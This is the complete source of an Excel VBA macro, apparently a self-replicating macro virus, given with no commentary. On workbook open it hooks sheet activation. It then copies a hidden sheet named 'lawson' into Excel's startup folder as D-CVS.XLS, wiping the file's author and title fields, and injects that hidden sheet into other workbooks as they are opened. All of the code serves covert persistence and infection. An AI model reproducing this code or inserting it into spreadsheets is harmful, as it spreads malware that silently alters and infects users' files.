Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "D-CVS.XLS")
    If m$ = "D-CVS.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = True
        n4$ = ActiveWorkbook.Name
    Sheets("lawson").Visible = True
    Sheets("lawson").Select
    Sheets("lawson").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "D-CVS.XLS", FileFormat:=xlNormal         , Password:="", WriteResPassword:="", ReadOnlyRecommended:=         False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("lawson").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "D-CVS.xls!check_files"
    Case 1
    Application.ScreenUpdating = True
        n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "lawson" Then
        Workbooks("D-CVS.XLS").Sheets("lawson").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("lawson").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "D-CVS.xls!check_files"
    Case Else
End Select
End Sub
